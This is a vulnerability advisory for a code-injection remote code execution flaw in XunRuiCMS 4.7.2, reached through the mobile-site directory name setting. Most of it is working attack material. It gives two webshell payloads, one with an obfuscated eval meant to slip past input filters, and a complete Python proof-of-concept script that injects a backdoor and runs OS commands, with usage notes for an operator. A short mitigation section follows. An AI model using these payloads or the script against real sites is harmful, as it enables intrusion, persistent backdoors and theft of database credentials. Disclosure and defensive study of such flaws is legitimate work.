# XunRuiCMS / XunRuiPHP 4.7.2 — Anonymous-reachable RCE via mobile-site directory name (code injection)

- **Product**: XunRuiCMS (XunRuiPHP)
- **Version**: 4.7.2
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **Impact**: Remote Code Execution as the web-server user
- **Privilege**: **the injected code is reachable anonymously** — the payload executes while the entry file is generated, and the resulting `<dir>/index.php` then answers arbitrary HTTP requests with no authentication at all; only the single configuration write uses a back-end session
- **Attack path**: single back-end request — save the mobile-site configuration (`data[dirname]`) → the CMS generates `<dirname>/index.php` under the web root → the injected PHP is **anonymously** reachable over HTTP immediately
- **Relevant code**: mobile-site configuration save → entry-file generation that writes attacker-controlled data into a PHP string literal with a raw `str_replace` (see `Site::update_webpath()`); the generated entry file ends up in the web root
- **Tested on**: XunRuiCMS 4.7.2 · PHP 7.4.33 · Apache 2.4 (Debian) · MySQL 8.0.46 · web root `/var/www/html`

## Summary

The mobile-site directory name (`data[dirname]`) is used both as a **path fragment** and as a **value written into generated PHP source** without escaping. A dirname that closes the string literal therefore injects arbitrary PHP into the generated entry file, which the CMS writes into the web root. The payload lands and becomes reachable/executable in the same request — no task queue, no notification, no SMTP and no extra business action is needed, and the generated entry file then answers **anonymous** requests as a persistent backdoor. This is the shortest code-execution path verified in this assessment.

## Root cause

The mobile-site save accepts an unvalidated directory name and reuses it in two dangerous positions:

1. as a **path** — the generated entry file is written under `<dir>`, so the value must not contain `/` (the PoC works around this by joining the path inside PHP);
2. as **source code** — the value is substituted into a PHP string literal with a raw `str_replace`, so a single `'` closes the literal and lets the attacker append statements.

Payload form: `<dir>/x'); <php statements>; #/..`

- `x');` closes `file_put_contents('<dir>/x', '` and closes the call;
- `<php statements>` is executed while the entry file is generated;
- `#/..` comments out the remainder of the generated line and leaves the file in a clean directory.

Two variants were verified:

| Variant | Payload (`data[dirname]`) | Result |
|---|---|---|
| A — backtick shell | `zzmob/x');echo \`$_GET[0]\`;#/..` | `zzmob/index.php` executes OS commands: `GET /zzmob/index.php?0=id` |
| B — eval shell | `zzmobe3/x');file_put_contents($_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.'zz_eval3.php',chr(60).'?php ev'.'al'.chr(40).'$_GET[0]'.chr(41).';');#/..` | drops an independent PHP shell (`/zz_eval3.php?0=<php>`) that survives `disable_functions` |

Variant B observes the CI4 filter rules: no literal `eval(` (split as `'ev'.'al'.chr(40)`), no `<`/`>`/`;`, and no `/` inside the payload (the path is joined with `DIRECTORY_SEPARATOR`).

## PoC script (`2.py`)

```
python 2.py http://<target> "<cookie>" admin82b8542a912e.php
```

```python
import sys, re, requests

b = sys.argv[1].rstrip("/")
ck = sys.argv[2]
e = sys.argv[3] if len(sys.argv) > 3 else "admin.php"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
s.headers["Cookie"] = ck
a = b + "/" + e
p = "zzmob/x');echo `$_GET[0]`;#/.."

r = s.get(a, allow_redirects=False)
print("entry          HTTP", r.status_code, flush=True)
if r.status_code == 404:
    print("admin entry not found: /%s" % e)
    sys.exit(1)

r = s.get(a + "?s=cms&c=site_mobile&m=index", allow_redirects=False)
print("session        HTTP", r.status_code, flush=True)
if r.status_code != 200:
    print("invalid session: cookie expired or User-Agent mismatch")
    sys.exit(1)

h = s.get(a + "?s=cms&c=site_mobile&m=index").text
form = dict(re.findall(r'name="([^"]+)"[^>]*?value="([^"]*)"', h))
mm = re.search(r'name="data\[mode\]"[^>]*value="([^"]*)"[^>]*checked', h)
omode, odir = (mm.group(1) if mm else "0"), form.get("data[dirname]", "")

r = s.post(a + "?s=cms&c=site_mobile&m=index", data={"data[mode]": "1", "data[dirname]": p})
print("write-mobile   HTTP", r.status_code, r.text[:110].replace("\n", " "), flush=True)
print(s.get(b + "/zzmob/index.php?0=id").text[:200])

s.post(a + "?s=cms&c=site_mobile&m=index", data={"data[mode]": omode, "data[dirname]": odir})
print("restored")
```

Notes for the operator: the back-end session is bound to the User-Agent (and is invalidated by a password change), so use the cookie of the client you are working with; a wrong entry name answers `404` from Apache and nothing happens at all. The script records the current mobile settings **before** the overwrite and, after the shell is confirmed, restores `data[mode]`/`data[dirname]` only (the generated directory is left in place).

## Database-driver independence

`dirname` is stored through the query builder and then written into the generated entry file by PHP, so the payload is entirely PHP-side and applies to every supported driver (`MySQLi` / `SQLite3` / `Postgre` / `SQLSRV`).

## Impact

Arbitrary code execution as the web-server user, obtained with **one** authenticated back-end request, without touching any pre-existing business data. The dropped file is a persistent backdoor, and the application configuration can be read (including the plaintext database credentials in `config/database.php`).

## Mitigation

1. Validate `dirname` strictly (e.g. `^[A-Za-z0-9_\-]+$`), reject `/`, `..`, quotes and control characters, and never use it as a path fragment without normalisation.
2. Generate the entry file with `var_export($value)` (or a template engine that escapes data) instead of a raw `str_replace` into a PHP string literal.
3. Restrict the write target to an existing, pre-created directory inside the web root; verify the resolved path stays inside that directory before `file_put_contents()`.
4. Treat all directory-name / domain / path fields of the mobile-site configuration as untrusted input; apply the same rules in `Site::update_webpath()`.
5. Apply least privilege to the web-server user and monitor newly created PHP files inside the web root.
